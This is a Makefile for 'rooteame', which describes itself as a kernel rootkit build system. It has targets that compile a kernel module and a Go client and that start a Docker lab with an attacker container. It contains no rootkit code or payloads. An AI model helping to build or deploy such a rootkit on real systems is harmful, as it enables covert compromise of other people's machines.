.PHONY: all kernel client test test-go test-integration docker-build docker-up docker-down clean

all: kernel client

# Build kernel module (requires GCC + kernel headers on native Linux)
kernel:
	$(MAKE) -C src

# Build Go client
client:
	cd client/go && go build -ldflags="-s -w" -o rooteame ./cmd/rooteame/
	@echo "[+] Go client: client/go/rooteame"

# Run Go unit tests
test-go:
	cd client/go && go test ./... -v -count=1

# Run integration tests (requires VM with loaded kernel module)
test-integration:
	@echo "[!] Integration tests require a native Linux VM with the kernel module loaded."
	@echo "    Run: sudo bash tests/integration.sh"

# All tests (unit + integration placeholder)
test: test-go
	@echo "[*] Unit tests passed."
	@echo "[!] For integration tests, run on a VM: sudo bash tests/integration.sh"

# Docker operations
docker-build:
	bash docker/test.sh build

docker-up:
	bash docker/test.sh up

docker-down:
	bash docker/test.sh down

docker-test: docker-build docker-up
	@echo "[*] Environment ready for manual testing."
	@echo "    docker exec -it rooteame-attacker bash"

# Clean
clean:
	$(MAKE) -C src clean
	rm -f client/go/rooteame
	rm -rf docker/out/*
	@echo "[+] Cleaned"

# Help
help:
	@echo "rooteame — Kernel Rootkit Build System"
	@echo ""
	@echo "Targets:"
	@echo "  kernel           Build kernel module (requires GCC + kernel headers)"
	@echo "  client           Build Go CLI client"
	@echo "  test             Run Go unit tests"
	@echo "  test-integration Run all tests (on VM)"
	@echo "  docker-build     Build kernel module in Docker"
	@echo "  docker-up        Start multi-node test environment"
	@echo "  docker-down      Tear down test environment"
	@echo "  clean            Remove build artifacts"
